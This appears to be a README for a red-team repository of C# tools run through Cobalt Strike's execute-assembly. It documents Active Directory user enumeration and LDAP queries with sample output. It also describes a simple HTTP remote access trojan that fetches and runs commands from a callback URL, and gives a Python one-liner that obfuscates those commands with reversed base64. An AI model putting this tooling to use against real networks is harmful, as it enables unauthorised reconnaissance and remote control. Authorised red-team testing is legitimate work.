# RedTeamCSharpScripts
C# Script used for Red Team. These binaries can be used by Cobalt Strike execute-assembly or as standalone executable. 

# enumerateuser.cs

List all the users samaccountname & mail

```
execute-assembly C:\enumerateuser.exe domain
```

# ldapquery.cs

Perform custom ldap queries

```
execute-assembly C:\enumerateuser.exe ringzer0team "(&(objectCategory=User)(samaccountname=Mr.Un1k0d3r))" samaccountname,mail

Querying LDAP://ringzer0team
Querying: (&(objectCategory=User)(samaccountname=Mr.Un1k0d3r))
Extracting: samaccountname,mail
Mr.Un1k0d3r,Mr.Un1k0d3r@corp.com,
```

# simple-http-rat.cs

A simple RAT that execute command over HTTP. The code is calling back every 10 seconds and will execute the data present on the callback URL.

``rat.exe callbackurl`

The data is obfuscated using the following python trick

```
$ python -c 'import base64; print base64.b64encode("cmd.exe /c whoami")[::-1]'
=kWbh9Ga3ByYvASZ4VmLk12Y
```

# Credit

Mr.Un1k0d3r RingZer0 Team
